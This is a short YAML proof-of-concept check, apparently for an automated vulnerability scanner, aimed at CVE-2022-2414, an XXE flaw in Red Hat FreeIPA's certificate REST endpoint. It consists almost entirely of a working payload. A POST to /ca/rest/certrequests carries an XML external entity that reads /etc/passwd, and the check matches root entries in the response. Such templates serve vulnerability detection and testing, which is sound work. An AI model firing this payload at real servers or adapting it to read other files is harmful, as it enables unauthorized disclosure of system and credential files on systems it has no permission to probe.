name: poc-yaml-red-hat-freeipa-cve-2022-2414-xxe
manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /ca/rest/certrequests
            headers:
                Content-Type: application/xml
            body: |
                <!--?xml version="1.0" ?-->
                <!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd">]>
                <CertEnrollmentRequest>
                    <Attributes/>
                    <ProfileID>&ent;</ProfileID>
                </CertEnrollmentRequest>
        expression: response.status == 400 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
expression: r0()
detail:
    author: z92g(https://github.com/z92g)
    links:
        - https://access.redhat.com/security/cve/cve-2022-2414
        - https://portswigger.net/daily-swig/vulnerability-in-open-source-identity-management-system-free-ipa-could-lead-to-xxe-attacks
    vulnerability:
        id: CT-466976
        level: high
